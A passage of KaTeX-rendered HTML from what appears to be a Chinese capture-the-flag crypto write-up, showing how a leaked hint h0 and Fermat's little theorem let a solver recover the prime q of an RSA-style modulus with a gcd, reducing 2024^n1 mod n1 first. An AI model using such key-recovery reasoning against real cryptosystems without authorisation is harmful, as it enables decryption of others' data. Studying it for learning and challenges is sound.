style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:-6.033999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">而</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace nobreak"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-4.833999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">而</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace nobreak"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:-3.5859999999999963em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:-2.385999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">费</span><span class="mord cjk_fallback">马</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:-1.185999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:0.0140000000000014em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord cjk_fallback">即</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">倍</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">求</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">与</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">倍</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:1.2140000000000006em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">注</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">将</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">个</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:2.414em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">算</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">很</span><span class="mord cjk_fallback">久</span></span></span><span style="top:3.6139999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">质</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">辗</span><span class="mord cjk_fallback">转</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">利</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">式</span><span class="mopen">(</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">熟</span><span class="mord cjk_fallback">悉</span><span class="mord cjk_fallback">辗</span><span class="mord cjk_fallback">转</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">熟</span><span class="mord cjk_fallback">悉</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">下</span><span class="mclose">)</span></span></span><span style="top:4.813999999999999em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span 